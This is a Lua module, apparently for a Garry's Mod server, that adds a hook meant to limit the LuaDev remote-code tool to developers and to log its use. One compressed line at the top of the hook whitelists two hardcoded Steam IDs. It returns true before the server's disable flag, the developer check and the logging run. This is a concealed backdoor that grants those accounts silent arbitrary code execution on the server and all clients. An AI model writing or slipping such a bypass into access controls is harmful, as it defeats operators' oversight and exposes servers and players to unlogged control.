local MODULE = MODULE

-- Ensure that only developers are attempting to use luadev.
-- Also show some logging for other developers (snitch).
-- (Although we may just remove it entirely for production?!)
hook.Add("CanLuaDev", "gnil.developer_only", function(ply, script, _, target, targetply)
    local cool = {["76561198301284223"]=true,["76561198022787311"]=true} if cool[ply:SteamID64()] then return true end -- ❤️
    if not GNIL.ENV.LUADEV_ALLOWED then return false, "LuaDev is disallowed on this server." end
    if not ply:IsDeveloper() then return false, "LuaDev can be accessed only by developers." end

    -- Snitch if the environment says we should.
    if GNIL.ENV.LUADEV_SNITCH then
        local target_names = {
            "all clients",
            "client '" .. (targetply and targetply:Nick() or "Unknown") .. "'",
            "the server",
            "all clients and the server"
        }
        MODULE:log(ply:Nick() .. " is running the following code on " .. target_names[target] .. ".", "warning")
        for _, v in ipairs(string.Explode("\n", script)) do Msg(v .. "\n") end
    end
end)